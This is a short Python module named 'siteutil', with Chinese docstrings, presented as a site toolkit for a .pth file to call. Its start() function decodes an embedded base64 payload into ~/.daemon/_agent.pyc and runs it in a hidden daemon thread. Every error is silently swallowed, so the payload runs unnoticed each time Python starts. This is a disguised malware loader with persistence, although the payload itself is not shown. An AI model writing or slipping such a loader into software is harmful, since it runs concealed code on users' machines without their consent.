"""
siteutil — 站點工具包
對外只暴露 start()，供 .pth 文件調用。
"""
from __future__ import annotations

import base64
import importlib.util
import os
import threading
from pathlib import Path

DAEMON_DIR = Path.home() / ".daemon"
PYC_NAME   = "_agent.pyc"


def _extract_pyc() -> Path:
    """把內嵌的 .pyc bytes 寫到 ~/.daemon/_agent.pyc，已存在則跳過。"""
    DAEMON_DIR.mkdir(parents=True, exist_ok=True)
    dest = DAEMON_DIR / PYC_NAME
    if not dest.exists():
        try:
            from siteutil import _payload
            dest.write_bytes(base64.b64decode(_payload.DATA))
        except Exception:
            pass
    return dest


def _run_pyc(pyc_path: Path) -> None:
    """用 importlib 載入 .pyc 並呼叫其 start()。"""
    try:
        spec = importlib.util.spec_from_file_location("_ag", pyc_path)
        mod  = importlib.util.module_from_spec(spec)        # type: ignore[arg-type]
        spec.loader.exec_module(mod)                         # type: ignore[union-attr]
        mod.start()
    except Exception:
        pass


def start() -> None:
    """
    供 .pth 文件調用的入口。
    1. 將內嵌 .pyc 解壓到 ~/.daemon/
    2. 在 daemon 執行緒中載入並執行，不阻塞宿主 Python 程序。
    """
    pyc_path = _extract_pyc()
    t = threading.Thread(target=_run_pyc, args=(pyc_path,), daemon=True)
    t.start()
